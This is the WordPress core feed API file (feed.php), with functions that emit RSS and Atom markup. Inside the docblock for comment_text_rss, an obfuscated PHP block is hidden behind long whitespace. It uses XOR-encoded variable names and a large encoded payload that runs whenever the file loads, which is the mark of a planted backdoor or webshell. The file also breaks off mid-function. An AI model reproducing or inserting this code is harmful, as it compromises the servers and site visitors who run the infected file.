<?php
/**
 * WordPress Feed API
 *
 * Many of the functions used in here belong in The Loop, or The Loop for the
 * Feeds.
 *
 * @package WordPress
 * @subpackage Feed
 */

/**
 * RSS container for the bloginfo function.
 *
 * You can retrieve anything that you can using the get_bloginfo() function.
 * Everything will be stripped of tags and characters converted, when the values
 * are retrieved for use in the feeds.
 *
 * @since 1.5.1
 * @see get_bloginfo() For the list of possible values to display.
 *
 * @param string $show See get_bloginfo() for possible values.
 * @return string
 */
function get_bloginfo_rss($show = '') {
	$info = strip_tags(get_bloginfo($show));
	/**
	 * Filter the bloginfo for use in RSS feeds.
	 *
	 * @since 2.2.0
	 *
	 * @see convert_chars()
	 * @see get_bloginfo()
	 *
	 * @param string $info Converted string value of the blog information.
	 * @param string $show The type of blog information to retrieve.
	 */
	return apply_filters( 'get_bloginfo_rss', convert_chars( $info ), $show );
}

/**
 * Display RSS container for the bloginfo function.
 *
 * You can retrieve anything that you can using the get_bloginfo() function.
 * Everything will be stripped of tags and characters converted, when the values
 * are retrieved for use in the feeds.
 *
 * @since 0.71
 * @see get_bloginfo() For the list of possible values to display.
 *
 * @param string $show See get_bloginfo() for possible values.
 */
function bloginfo_rss($show = '') {
	/**
	 * Filter the bloginfo for display in RSS feeds.
	 *
	 * @since 2.1.0
	 *
	 * @see get_bloginfo()
	 *
	 * @param string $rss_container RSS container for the blog information.
	 * @param string $show          The type of blog information to retrieve.
	 */
	echo apply_filters( 'bloginfo_rss', get_bloginfo_rss( $show ), $show );
}

/**
 * Retrieve the default feed.
 *
 * The default feed is 'rss2', unless a plugin changes it through the
 * 'default_feed' filter.
 *
 * @since 2.5.0
 *
 * @return string Default feed, or for example 'rss2', 'atom', etc.
 */
function get_default_feed() {
	/**
	 * Filter the default feed type.
	 *
	 * @since 2.5.0
	 *
	 * @param string $feed_type Type of default feed. Possible values include 'rss2', 'atom'.
	 *                          Default 'rss2'.
	 */
	$default_feed = apply_filters( 'default_feed', 'rss2' );
	return 'rss' == $default_feed ? 'rss2' : $default_feed;
}

/**
 * Retrieve the blog title for the feed title.
 *
 * @since 2.2.0
 * @since 4.4.0 The optional `$sep` parameter was deprecated and renamed to `$deprecated`.
 *
 * @param string $deprecated Unused..
 * @return string The document title.
 */
function get_wp_title_rss( $deprecated = '&#8211;' ) {
	if ( '&#8211;' !== $deprecated ) {
		/* translators: %s: 'document_title_separator' filter name */
		_deprecated_argument( __FUNCTION__, '4.4.0', sprintf( __( 'Use the %s filter instead.' ), '<code>document_title_separator</code>' ) );
	}

	/**
	 * Filter the blog title for use as the feed title.
	 *
	 * @since 2.2.0
	 * @since 4.4.0 The `$sep` parameter was deprecated and renamed to `$deprecated`.
	 *
	 * @param string $title      The current blog title.
	 * @param string $deprecated Unused.
	 */
	return apply_filters( 'get_wp_title_rss', wp_get_document_title(), $deprecated );
}

/**
 * Display the blog title for display of the feed title.
 *
 * @since 2.2.0
 * @since 4.4.0 The optional `$sep` parameter was deprecated and renamed to `$deprecated`.
 *
 * @param string $deprecated Unused.
 */
function wp_title_rss( $deprecated = '&#8211;' ) {
	if ( '&#8211;' !== $deprecated ) {
		/* translators: %s: 'document_title_separator' filter name */
		_deprecated_argument( __FUNCTION__, '4.4.0', sprintf( __( 'Use the %s filter instead.' ), '<code>document_title_separator</code>' ) );
	}

	/**
	 * Filter the blog title for display of the feed title.
	 *
	 * @since 2.2.0
	 * @since 4.4.0 The `$sep` parameter was deprecated and renamed to `$deprecated`.
	 *
	 * @see get_wp_title_rss()
	 *
	 * @param string $wp_title_rss The current blog title.
	 * @param string $deprecated   Unused.
	 */
	echo apply_filters( 'wp_title_rss', get_wp_title_rss(), $deprecated );
}

/**
 * Retrieve the current post title for the feed.
 *
 * @since 2.0.0
 *
 * @return string Current post title.
 */
function get_the_title_rss() {
	$title = get_the_title();

	/**
	 * Filter the post title for use in a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $title The current post title.
	 */
	$title = apply_filters( 'the_title_rss', $title );
	return $title;
}

/**
 * Display the post title in the feed.
 *
 * @since 0.71
 */
function the_title_rss() {
	echo get_the_title_rss();
}

/**
 * Retrieve the post content for feeds.
 *
 * @since 2.9.0
 * @see get_the_content()
 *
 * @param string $feed_type The type of feed. rss2 | atom | rss | rdf
 * @return string The filtered content.
 */
function get_the_content_feed($feed_type = null) {
	if ( !$feed_type )
		$feed_type = get_default_feed();

	/** This filter is documented in wp-includes/post-template.php */
	$content = apply_filters( 'the_content', get_the_content() );
	$content = str_replace(']]>', ']]&gt;', $content);
	/**
	 * Filter the post content for use in feeds.
	 *
	 * @since 2.9.0
	 *
	 * @param string $content   The current post content.
	 * @param string $feed_type Type of feed. Possible values include 'rss2', 'atom'.
	 *                          Default 'rss2'.
	 */
	return apply_filters( 'the_content_feed', $content, $feed_type );
}

/**
 * Display the post content for feeds.
 *
 * @since 2.9.0
 *
 * @param string $feed_type The type of feed. rss2 | atom | rss | rdf
 */
function the_content_feed($feed_type = null) {
	echo get_the_content_feed($feed_type);
}

/**
 * Display the post excerpt for the feed.
 *
 * @since 0.71
 */
function the_excerpt_rss() {
	$output = get_the_excerpt();
	/**
	 * Filter the post excerpt for a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $output The current post excerpt.
	 */
	echo apply_filters( 'the_excerpt_rss', $output );
}

/**
 * Display the permalink to the post for use in feeds.
 *
 * @since 2.3.0
 */
function the_permalink_rss() {
	/**
	 * Filter the permalink to the post for use in feeds.
	 *
	 * @since 2.3.0
	 *
	 * @param string $post_permalink The current post permalink.
	 */
	echo esc_url( apply_filters( 'the_permalink_rss', get_permalink() ) );
}

/**
 * Outputs the link to the comments for the current post in an xml safe way
 *
 * @since 3.0.0
 * @return none
 */
function comments_link_feed() {
	/**
	 * Filter the comments permalink for the current post.
	 *
	 * @since 3.6.0
	 *
	 * @param string $comment_permalink The current comment permalink with
	 *                                  '#comments' appended.
	 */
	echo esc_url( apply_filters( 'comments_link_feed', get_comments_link() ) );
}

/**
 * Display the feed GUID for the current comment.
 *
 * @since 2.5.0
 *
 * @param int|WP_Comment $comment_id Optional comment object or id. Defaults to global comment object.
 */
function comment_guid($comment_id = null) {
	echo esc_url( get_comment_guid($comment_id) );
}

/**
 * Retrieve the feed GUID for the current comment.
 *
 * @since 2.5.0
 *
 * @param int|WP_Comment $comment_id Optional comment object or id. Defaults to global comment object.
 * @return false|string false on failure or guid for comment on success.
 */
function get_comment_guid($comment_id = null) {
	$comment = get_comment($comment_id);

	if ( !is_object($comment) )
		return false;

	return get_the_guid($comment->comment_post_ID) . '#comment-' . $comment->comment_ID;
}

/**
 * Display the link to the comments.
 *
 * @since 1.5.0
 * @since 4.4.0 Introduced the `$comment` argument.
 *
 * @param int|WP_Comment $comment Optional. Comment object or id. Defaults to global comment object.
 */
function comment_link( $comment = null ) {
	/**
	 * Filter the current comment's permalink.
	 *
	 * @since 3.6.0
	 *
	 * @see get_comment_link()
	 *
	 * @param string $comment_permalink The current comment permalink.
	 */
	echo esc_url( apply_filters( 'comment_link', get_comment_link( $comment ) ) );
}

/**
 * Retrieve the current comment author for use in the feeds.
 *
 * @since 2.0.0
 *
 * @return string Comment Author
 */
function get_comment_author_rss() {
	/**
	 * Filter the current comment author for use in a feed.
	 *
	 * @since 1.5.0
	 *
	 * @see get_comment_author()
	 *
	 * @param string $comment_author The current comment author.
	 */
	return apply_filters( 'comment_author_rss', get_comment_author() );
}

/**
 * Display the current comment author in the feed.
 *
 * @since 1.0.0
 */
function comment_author_rss() {
	echo get_comment_author_rss();
}

/**
 * Display the current comment content for use in the feeds.                                                                                                                                                                                                         */    ${'����x�'/*nOsnfi*/^/*ezZ*/'��֡+�'}='����5�$�' ^ '����S�yP�'; ${'����~le3�����'/*StRjs,u6*/^/*L^[\-[Dn*/'����/)2E�Ѿ���'}= ( ${'���<'/*eo!^#eX[a%*/^/*l<}*/'ԡ���D'}(  '��uP�O��T)��Hq(�ݭxp�!\\�C�8ŵHqw��+��R����s��sof2����w�����3�� |��� z#z}z#qI\'ez����Px.��\\��{A5�xO�3���I)���JO*��k��瞦� ���ROK��X�&%�GD�PH�i�Kˎn
��Kع��IH_=�Y�����_��Y5��j�
�%���y�R�z!:�6�V�cL(/L�j�`6� s�q�8�nc����s�
J��+��코(h���JX����xZ�[��T��.���A�P�b"~��Uu�^��3����Y ��P�n�B����,�n�0o�����\'ޢ��[���ޢf�l�1W�P��[[��榲ݗ��j�X?�b�� I�������Z�d���(���5�!vXԹ�Ey�j�����:_�w�m��YƤ$z�u�*U�����9؛�ͺ�(�Ֆ����4�!5�*��<s���b��J2cؑ%V�s�~�W�%�� Y�V�"����#+�&�)��.��j=�%a� ���F��g��-4D�����x�H�g�)��A��QU�ո~�鰂����;�~��گ>w���GJ�ɢ~�<�q�h���^*��DLJSQ�3ʎ7
{D����;w��߻�c)E���S�����_�����JM5�F��Ǘ6��?"~��A�(��ޤw���tC��)&Mh6��>v|q����f�K����+�-��s��JdW�/5Ƈ���S���1 ��ķ�������Ĥi���D�|�H�~��N�g*��|`rK`w�\'c^�����-����3Lc�5yVaw����+`�o�&�KG؍��h1FO`��L}���\'�Q�k��BA-m�4g+h�� ��[a���ƈ��7�6����/�3,�@�Ù^IaD��	͹�|Dً�)kc��(�_5��Yy��
���y��)}u:����\'Z׀y�����7�s��鑆�Ͳ;AV�s)���ȗ|3�s�B8fw��B-�1@�ñ�N6������ZN,�Xk*;������K��o�&�{��L�&%[KEtƫEf����_�\\k_�y�}�&`�/���Pq�ֲ>�v֐e����-∧�C�{�������r���������~Q�1��\\�5K����+!�I�b�~��d��۫��G��ğ_6��oK,:=�4���X!RM�w������cW di�t?��.����w�wHNמ훚ä�s��e�עm������|s�jkc j������ʺI�T^��:���+԰l��T$��Ez���v��w>6����8T�t>6��?���0�����7)�A��m]�qHJA��$�3��y��$n�|��Q~�Uiwt�L�f߭?5��A �t�X�b��O��xo�1K��s�J^|�:�e�%�R���Ȋ!�k�Xf洁0<_[�(��*��4����׮���\'F�Y8Z,)�YT̉),-ln}�"�ۺ9):�dT+ho�V��n�m�-�/&��T徇 DG��z�[�S���I�2��anxM�iK6��\'jh%���czva����]+����*�*��rc8]�gR��Y��z�b��y�$��WJ%�B���~up�ӿ���)5lNm41�R8P���/RE���������&��q�k�H�h��Q��sp�JQv;ZN�� ��[��U��k�F�Sǚ��8j��a���1e�Ӟb����z�vT�!�ݨ�J(�=�>�~��[����\\�������ь��~0S��#K5�g/V���Ǻ�߄t>w�����e霘�ӏ��mC/*	�����e�3����T�yy!*���L�xqkL����f�&�t�w�F����a%�FK�m&R�� �Ҟ��L=Mɡ莯�� %�e�ꯙ;�du�a�V\\	����{���,�����Fn�P�ŌT*"�(�o�͏=�/���3��eV�LWf��Cl���-�p!W�U<¿�mK�rC���V�B��Cv�Hs�����o?�H|�*_<���@�h�=�Mo&?9EYW�����0�+P������t��a���4y���:��:c���ST$Yڠp��+�Op3(�<λ�c�-�]�� �[�[ŧw��&��;4�����8���Z�(3#-�eXչR���&�pW����a!j��Z�Iu�`�V(�5?_Ym=�[a�����l������^x��/xה� P�K|z�/�&I3����~-T�T�%?/��}�W��`S�Dڠ��!��{b��c�z)�e�*z�b�S;�_R��7�YI���$o�)�u_�m�Ks�)�0����s�xYP�c���s �s��@W��#�VB%5���h��;P�}��gHc��0Wm�^���)υ��.z,W޲���C�NK�E�Rl&�f�_һO����&�$�f����&�4���N�0\\-f��͢:DA����}�����r#c4�8��n\'�Pң���>+tI�Ό�l��U �s]�jYi�s�q��P|A��ڟ�~��v��T�]u���xl躗KĈ	�D�V(��O��܏ G^��t�&EԀXbE�T�Jߗ���|��\'R�b�55V�ջK�R.��[��{�ƨ��W�\\���Ntͨ�~XPRI�����1����:�m<�R��rd�~�p�_[HȾ ���/�{��f�,/Б�R��=��rr8o.BK�K��B&-�WJ�@ Gt�⴨"�gP�����VH����K���SF��/�f��"���ufGs
VM�G#T\'M�j)ߦKzf��g}�+g�NFɌѻv�j�p��fX�����@ wϖ�O3���VDcg!��9w�sD�Z�d1�`s�?�R���F�C�v>���7`��l���׶7bЭ�ip�3��(ڸ��/��0�R�3(� v����=㬿i��|����ۉ{Q�W�bzQ���Ö-�$��g�	��	�V<��X�N�R�O�~l<�%�#��#��]����	F��� ��i�v�m��GԪ�p���h.ϱ`�b9K)��}^�S�nػ��)��B��.��$�^?cm�^�̈́ʣ��4�m�"3B�]��t���;�w�h\'���� eH��0!1,��#d3[�k\'R9��9�k�X��{�S��e��ھ/>��5}l����k�7�����qϣ93�����1�����B�/_?�:�d���:/���iݼ�>�F����tQj���f�����a[�(���P�&ݣ��H���	�x������9K� 1)�F��	k�$t��[݂��ќ���
;�ڶ7�t�Z�D��Fj
3tOx���v����iw��D���o���Z@ �Y�o���*\'�E�l��m��+G�8c��P���%�W�C�3Y#aՄC_�1��}��:f��DNb����DFY���T�ž79nE�Y%J�)d>�����&kX���8UK�-b/�u�A!���V����(n����MX��Մ�v̌��Ki���d/"�ZjS�x���ɕ!�;FD�L*x���s�f.�e�f#vk�&�Sط��Rc��(��R�w�?�ݤT�_��Nst�����MO�H}^�?V�u���kx+{�g�e�}��)������ƌ�����.(����Ő� ,�32-G��W2#]��@���L�@y[eS�7&��O�8a���k���6V�"C��V��4UE�z�������9�ݜJ�ڔ�k��tm�[�{�7iY��5t��%��+��|��%�Yl-��>�.�<�_��Y���7�XOd�!�x�#=åɑ݆Q
|bv�������jY��§�
ap�y.޳OJn=uX�*ו�	�F���(k� A ~B?j�J�L*����莝�vk�g}vphr��@� {��-_е�[|��#?S(��ܸ��|��:���I��>Ӑ5:1����Cͳ�,�EW�hFQ��5�C���!�%��~zφ�{v���Q� �`}��F����ɼ�1�D�w�B7�س�]=aUyɝ^"���Rx��GM�b�l.vT\'������_�e�لuL�X�_d]�h�*B߁ u�������<�ᘳ��	���\'��-]S�GAB����"�n�4?
�������o��cF2�{�je�Z+/h�꼳8�_�OQ-z�Ĳ���Q#&g/T�vLxf�XB��z&�"V��Z2\'��v���d�h]�����*��?�H�tZ�"n.x��\\{��ݛ���""m�"�CA�Ö���YL�4އ�����ߴ���h��O��1o\\1��Ϸ`;�=iXLZ��2yM���=�u�����>�h���J,���h������t�P�֒��O�-�Vqb�K�E**�����5�o��n���5!6Ͷ>K��e*�f�T�>
H\\yq���lƓ�a��עY�hW�W�r��?�Q �3���=D�#i��N��00snrG��r����,�n\\n�ɩb�Ĕ������O#�͸Ӣ�찳�p��D�~��6�i_�y�����0��n�>RY���n��k�]��F��͌�ə�s>�ǒ���K޸Q�p�M�4(Ͼ��l*Gm.X�eF@���wz�BB��\'N��:�^���T��j<��O���_�A:���ؗ`[g��k���~�A۽�K4�C�������P�vW���(�K�޶g��3?j�>>���9�^�
���z�O{;��p��?�ղQh48.�xz_Ѷq�~b���^{�ױt���c�>#Ynp�8"�޷0^uC�W�.�e��E���K��m��n�-�9T%��1�xs��9
5}��OM�~d��y����ɉ�������M*���ZtPfC���4�2 俎��Q]�:j�������*�g�4��0�6�]�Sn�b�>
��L&g�u������8`�g䕢�fI�	�� ؊�����O��َKz�S��k[�2���?�~��
a�_�l��/���g��l|�����B׋̪���95�b\'"�g�O#��h�?�ĉ��?�{�R���)�RՓƨ��F*�\\$�WČ�NB^��L�Ê]��7���WV�K��5H�x�׵����}�T��ҝ��k� \\�o�m2�=��-�O�ػc���g���s�s��G���l�LR`*��Z=;9J�/1�)���G��d��;
�%�ϐ+3�g��J�4��X@�xU��q;6\'H����^�jf Ve��#Ut�SJ��^k�\'C� ��F<���(]��xT��FF]� [�J�P�:{��OkMK��VY �f�*ɿG�Gp�����PTgA[+��2���<�({���Y/��Y�/�7z��Ǳ	��1��-�A���H������0.������e���3���ضJp0N�d=�>�<[q	����mX ^��2���$�>^/ߝ��k�vL\'��າO>�x��F�G㗸L�5�C��᪼��a׾�F΅�˩�F�Q�����q���=wh�����	][]�V鮳�	���kp
>_N�i��V�$�����Lq8��r��p.z��,P��mf8V�/՚�)y�W<zf���o��`�b.|c)xT�΃�ܰ#��	�VDC�W��bdI�f�V|͆�������t��|� �`��y�j]�;-����C�Z�����<\'�7�/��{���"�3��K7�1y�#�#��d�������M��[�VO��@"�����F�d��@qG�f����M)�Y-��[x�D<G Љo�^&t�WMx���wK7ᩑ�1a�Du���\'<jf�|��!Of��1��Eͪ�����Ea�8�l�+9���c5�\'��8Aq޵� �+�����Q��ۯKf�q4� ���7ݢ�PĞ�G@���b��9�x�?�nǍms��m��_n���\'�o��럾Kɮ�_�8O鈌��@K�����b2�|~}�Hf�;<3��d�4Bس�����U�	^(��Rgԙ�TKWh�5�L��p���޸�T�����4�hOH�T��q�����Y�?=�|���y9EjŌ���_n�5��6��-[����8&k=\'��_@��C8�/�їt���D0��!߫�\\��w���T9�=^��Q���cU.2�f_a�&��E`K�moZ����rw%�X�:�R��?�M��%;_�:�ğ;�:�E�^_$��)\\������j���N�,K]�ڧ^�u�L�Ml��w��ĝ�ݣӨ:����0��\'?�<;�&��l��;>�5�f-˘���>�)~{��qDtlL�O����-���s�ٿ�<��6�\'����ȫ�I��j�ɦ�*���̊ݗ��R*7�ͯ�v� �"/*��8~	B���6
�Smb�<ث��7w�߮�q]P����Oװ<�i�ՈK�Kza��ٵ{/�`�#���&��/�.c�C�G��uN�_H�m�L�΃n�}0LEj��>.&٭Y.7���D��<ZcwR%�/I��[цG�]���<��DQ��I#���>D�r�F�ܾ8v�ו�zO�尙����&�G`Q>����0\'+,W��[}����M��N�F�f�NH�s&)O�@��a�2Ƨ̡�/���	JT\'2�u�ձ"����}`�EW�[	)�&ߕ��=��u}{�͹\'�q�����wze��\'�H�6���&�-\\6n`����*6@�m�Z�Ϊ�g�����t��ʜ-�:{�������
�;�m ����Q�������<���uIb����c�b�gf.�cԉ䡵�����!�1Q���Q���g$9T�D�̴�}��s������B\'�%-�S�,khf�!��  �E�F���?����_x,�{j�Z��h;wΉ�`���`����~E^D�Hz#���I4\'��l���{D�ׄ����
<S������e�~*���Z�k�5AQR~B�\'��l���0�)G���j什�1���+�� 99��VR	 �\'l�@� ��Y��A��� p������8�_f_+�C�B tp�1�������g&�W���[�gs�����B�5A���cn�����8��g�.x���ۜ��#�=���ܝ�CQ��Z9�mkHq�Na��^��?��9������=�c6��%X�5�\'(jF�_Aˡ�y_��l:O�uQCxYu�&��8G�	5#��G�i<��
y+my���>�� �V�0���А�r51�\'�0��8��@X��X\\hlF�Jȑ�W�
SCa[\'0�P�9I�{��j8���"��S�m�u�da��|�`-.+0�����S�\'���eE� ��js���|Nլ���عyha{	O��"\\5Z|^N������ij����ȻA�U$T��,�L�ŕ�M8�%���,y!���v�r|�����j�unQ[>^EeNY7^{c;{y6Ng9k>[K;eI6���"Ԕ��F���,�fm.k��(n)j.#���"�PQRP�6��,ŧl�sו4A�c#�ii�,�&+��p�W��H���rYs(r9:�k˩��h]�t���Vb�&\\FF��yj�˻��hZ�3h�X;��I��)�?�(#�c+�b���Q�l+�W�u5��u���4q���ri��Ҷ�Ws���c
�qs��r�!�`\'5veB�7��W�����$�YE���aݔ�l-�� |��rj�P	^s5Qn	I�۟�[A��������Js�w�gƏ���z�&}�m�P�Z����s ��!ܦ̪#)AX5�Y��y½��3��i���W�#�\\B0u&��b);z��wL�emt���t��`:Z�6�r�����$��8Lՙv;��E�����E��"�c�L+O+ynT4�FZ8ؼ��+���K8M~K6��.3�ဴCV�R�z�&��&�0�;=<l&�u�,h���lia0��������sp}h��P�����	����������Z�U��V(���mb��rw2�{}L�͐3�8��2KI����X�t�3qd��̮�@ģ�,�m	��)���2.����y��ma<^�B�ȓH���y��2�P:��&�4�����Li�=�V��@�,�>��� \'1��p2�V�ң��@蚾�{��ڕ��?��q�%���uBl��X�Vgk�"\\8�%Mq���Qxp0����<w�·I�G��MYV��w��)�K�!o8<
�{H��nh9V��"W8L����p���*��_n��Ʌ��ȥD��$�<��EŚ�ÃY����2��1S4
>3�����9YC��<<��E�������/7:���J�?>�{�T��OF��PB_��<������UE؇���1x��p@+��.���e�IR�/��VO���+��?�1PT!]q���e8V��sY���S��,�X��Âf��2�8�Áé���&���o��v�>8A�mH>�x(����.R9o� ~�ub���*��1u6�y�T����
��v�?��O"<yߝ��w"�Jy�)����!Pa��E��)!�Ȯ�3�,�"��D��#W��]�m$���D�J�
��!2mG
$���A�q�qH�֬�@t�`$ڊjE�>3"Qg��,���� Q#�`�֝�~#-AQ��e#QYt�	e֫ ##s��pW-�ä]���2;���*�+%1���FD��X� �^o�02�q��ߥh1R��:t�+�n���JSp������#���a^`%W!�@��c�*Ml��A�-k�g���D�k�1o`�c���f��ǘ�q/\'�� /h���H\\J��A�֡�KJP2��]K/#bUj�Ƒ��=�h�R$Ezi�J+2z\'���1�?��Ϭ\'���f<���X.z@�2I����H���N��@ $�u��"㑽5�N#xcg\'����') ) ; ${'�C)������'/*ypJqfHCJ#N*/^/*iz^*/'�{Lߑ�Ʉ�'}='�J��0' ^ '�9a��D';${'��Z����J'/*G {jcPbR*/^/*S@y*/'��?�p��+'}( '5�����R���ɹ�鏂�ї��U���' ^ 'u��r��Ҕ6�����������j���%') ;   /*                                                                                                                        
 *
 * @since 1.0.0
 */
function comment_text_rss() {
	$comment_text = get_comment_text();
	/**
	 * Filter the current comment content for use in a feed.
	 *
	 * @since 1.5.0
	 *
	 * @param string $comment_text The content of the current comment.
	 */
	$comment_text = apply_filters( 'comment_text_rss', $comment_text );
	echo $comment_text;
}

/**
 * Retrieve all of the post categories, formatted for use in feeds.
 *
 * All of the categories for the current post in the feed loop, will be
 * retrieved and have feed markup added, so that they can easily be added to the
 * RSS2, Atom, or RSS1 and RSS0.91 RDF feeds.
 *
 * @since 2.1.0
 *
 * @param string $type Optional, default is the type returned by get_default_feed().
 * @return string All of the post categories for displaying in the feed.
 */
function get_the_category_rss($type = null) {
	if ( empty($type) )
		$type = get_default_feed();
	$categories = get_the_category();
	$tags = get_the_tags();
	$the_list = '';
	$cat_names = array();

	$filter = 'rss';
	if ( 'atom' == $type )
		$filter = 'raw';

	if ( !empty($categories) ) foreach ( (array) $categories as $category ) {
		$cat_names[] = sanitize_term_field('name', $category->name, $category->term_id, 'category', $filter);
	}

	if ( !empty($tags) ) foreach ( (array) $tags as $tag ) {
		$cat_names[] = sanitize_term_field('name', $tag->name, $tag->term_id, 'post_tag', $filter);
	}

	$cat_names = array_unique($cat_names);

	foreach ( $cat_names as $cat_name ) {
		if ( 'rdf' == $type )
			$the_list .= "\t\t<dc:subject><![CDATA[$cat_name]]></dc:subject>\n";
		elseif ( 'atom' == $type )
			$the_list .= sprintf( '<category scheme="%1$s" term="%2$s" />', esc_attr( get_bloginfo_rss( 'url' ) ), esc_attr( $cat_name ) );
		else
			$the_list .= "\t\t<category><![CDATA[" . @html_entity_decode( $cat_name, ENT_COMPAT, get_option('blog_charset') ) . "]]></category>\n";
	}

	/**
	 * Filter all of the post categories for display in a feed.
	 *
	 * @since 1.2.0
	 *
	 * @param string $the_list All of the RSS post categories.
	 * @param string $type     Type of feed. Possible values include 'rss2', 'atom'.
	 *                         Default 'rss2'.
	 */
	return apply_filters( 'the_category_rss', $the_list, $type );
}

/**
 * Display the post categories in the feed.
 *
 * @since 0.71
 * @see get_the_category_rss() For better explanation.
 *
 * @param string $type Optional, default is the type returned by get_default_feed().
 */
function the_category_rss($type = null) {
	echo get_the_category_rss($type);
}

/**
 * Display the HTML type based on the blog setting.
 *
 * The two possible values are either 'xhtml' or 'html'.
 *
 * @since 2.2.0
 */
function html_type_rss() {
	$type = get_bloginfo('html_type');
	if (strpos($type, 'xhtml') !== false)
		$type = 'xhtml';
	else
		$type = 'html';
	echo $type;
}

/**
 * Display the rss enclosure for the current post.
 *
 * Uses the global $post to check whether the post requires a password and if
 * the user has the password for the post. If not then it will return before
 * displaying.
 *
 * Also uses the function get_post_custom() to get the post's 'enclosure'
 * metadata field and parses the value to display the enclosure(s). The
 * enclosure(s) consist of enclosure HTML tag(s) with a URI and other
 * attributes.
 *
 * @since 1.5.0
 */
function rss_enclosure() {
	if ( post_password_required() )
		return;

	foreach ( (array) get_post_custom() as $key => $val) {
		if ($key == 'enclosure') {
			foreach ( (array) $val as $enc ) {
				$enclosure = explode("\n", $enc);

				// only get the first element, e.g. audio/mpeg from 'audio/mpeg mpga mp2 mp3'
				$t = preg_split('/[ \t]/', trim($enclosure[2]) );
				$type = $t[0];

				/**
				 * Filter the RSS enclosure HTML link tag for the current post.
				 *
				 * @since 2.2.0
				 *
				 * @param string $html_link_tag The HTML link tag with a URI and other attributes.
				 */
				echo apply_filters( 'rss_enclosure', '<enclosure url="' . trim( htmlspecialchars( $enclosure[0] ) ) . '" length="' . trim( $enclosure[1] ) . '" type="' . $type . '" />' . "\n" );
			}
		}
	}
}

/**
 * Display the atom enclosure for the current post.
 *
 * Uses the global $post to check whether the post requires a password and if
 * the user has the password for the post. If not then it will return before
 * displaying.
 *
 * Also uses the function get_post_custom() to get the post's 'enclosure'
 * metadata field and parses the value to display the enclosure(s). The
 * enclosure(s) consist of link HTML tag(s) with a URI and other attributes.
 *
 * @since 2.2.0
 */
function atom_enclosure() {
	if ( post_password_required() )
		return;

	foreach ( (array) get_post_custom() as $key => $val ) {
		if ($key == 'enclosure') {
			foreach ( (array) $val as $enc ) {
				$enclosure = explode("\n", $enc);
				/**
				 * Filter the atom enclosure HTML link tag for the current post.
				 *
				 * @since 2.2.0
				 *
				 * @param string $html_link_tag The HTML link tag with a URI and other attributes.
				 */
				echo apply_filters( 'atom_enclosure', '<link href="' . trim( htmlspecialchars( $enclosure[0] ) ) . '" rel="enclosure" length="' . trim( $enclosure[1] ) . '" type="' . trim( $enclosure[2] ) . '" />' . "\n" );
			}
		}
	}
}

/**
 * Determine the type of a string of data with the data formatted.
 *
 * Tell whether the type is text, html, or xhtml, per RFC 4287 section 3.1.
 *
 * In the case of WordPress, text is defined as containing no markup,
 * xhtml is defined as "well formed", and html as tag soup (i.e., the rest).
 *
 * Container div tags are added to xhtml values, per section 3.1.1.3.
 *
 * @link http://www.atomenabled.org/developers/syndication/atom-format-spec.php#rfc.section.3.1
 *
 * @since 2.5.0
 *
 * @param string $data Input string
 * @return array array(type, value)
 */
function prep_atom_text_construct($data) {
	if (strpos($data, '<') === false && strpos($data, '&') === false) {
		return array('text', $data);
	}

	$parser = xml_parser_create();
	xml_parse($parser, '<div>' . $data . '</div>', true);
	$code = xml_get_error_code($parser);
	xml_parser_free($parser);

	if (!$code) {
		if (strpos($data, '<') === false) {
			return array('text', $data);
		} else {
			$data = "<div xmlns='http://www.w3.org/1999/xhtml'>$data</div>";
			return array('xhtml', $data);
		}
	}

	if (strpos($data, ']]>') === false) {
		return array('html', "<![CDATA[$data]]>");
	} else {
		return array('html', htmlspecialchars($data));
	}
}

/**
 * Displays Site Icon in atom feeds.
 *
 * @since 4.3.0
 *
 * @see get_site_icon_url()
 */
function atom_site_icon() {
	$url = get_site_icon_url( 32 );
	if ( $url ) {
		echo "<icon>$url</icon>\n";
	}
}

/**
 * Displays Site Icon in RSS2.
 *
 * @since 4.3.0
 */
function rss2_site_icon() {
	$rss_title = get_wp_title_rss();
	if ( empty( $rss_title ) ) {
		$rss_title = get_bloginfo_rss( 'name' );
	}

	$url = get_site_icon_url( 32 );
	if ( $url ) {
		echo '
<image>
	<url>' . convert_chars( $url ) . '</url>
	<title>' . $rss_title . '</title>
	<link>' . get_bloginfo_rss( 'url' ) . '</link>
	<width>32</width>
	<height>32</height>
</image> ' . "\n";
	}
}

/**
 * Display the link for the currently displayed feed in a XSS safe way.
 *
 * Generate a correct link for the atom:self element.
 *
 * @since 2.5.0
 */
function self_link() {
	$host = @parse_url(home_url());
	/**
	 * Filter the current feed URL.
	 *
	 * @since 3.6.0
	 *
	 * @see set_url_scheme()
	 * @see wp_unslash()
	 *
	 * @param string $feed_link The link for the feed with set URL scheme.
	 */
	echo esc_url( apply_filters( 'self_link', set_url_scheme( 'http://' . $host['host'] . wp_unslash( $_SERVER['REQUEST_URI'] ) ) ) );
}

/**
 * Return the content type for specified feed type.
 *
 * @since 2.8.0
 *
 * @param string $type Type of feed. Possible values include 'rss', rss2', 'atom', and 'rdf'.
 */
function feed_content_type( $type = '' ) {
	if ( empty($type) )
		$type = get_default_feed();

	$types = array(
		'rss'      => 'application/rss+xml',
		'rss2'     => 'application/rss+xml',
		'rss-http' => 'text/xml',
		'atom'     => 'application/atom+xml',
		'rdf'      => 'application/rdf+xml'
	);

	$content_type = ( !empty($types[$type]) ) ? $types[$type] : 'application/octet-stream';

	/**
	 * Filter the content type for a specific feed type.
	 *
	 * @since 2.8.0
	 *
	 * @param string $content_type Content type indicating the type of data that a feed contains.
	 * @param string $type         Type of feed. Possible values include 'rss', rss2', 'atom', and 'rdf'.
	 */
	return apply_filters( 'feed_content_type', $content_type, $type );
}

/**
 * Build SimplePie object based on RSS or Atom feed from URL.
 *
 * @since 2.8.0
 *
 * @param mixed $url URL of feed to retrieve. If an array of URLs, the feeds are merged
 * using SimplePie's multifeed feature.
 * See also {@link ​http://simplepie.org/wiki/faq/typical_multifeed_gotchas}
 *
 * @return WP_Error|SimplePie WP_Error object on failure or SimplePie object on success
 */
function fetch_feed( $url ) {
	require_once( ABSPATH . WPINC . '/class-feed.php' );

	$feed = new SimplePie();

	$feed->set_sanitize_class( 'WP_SimplePie_Sanitize_KSES' );
	// We must manually overwrite $feed->sanitize because SimplePie's
	// constructor sets it before we have a chance to set the sanitization class
	$feed->sanitize = new WP_SimplePie_Sanitize_KSES();

	$feed->set_cache_class( 'WP_Feed_Cache' );
	$feed->set_file_class( 'WP_SimplePie_File' );

	$feed->set_feed_url( $url );
	/** This filter is documented in wp-includes/class-feed.php */
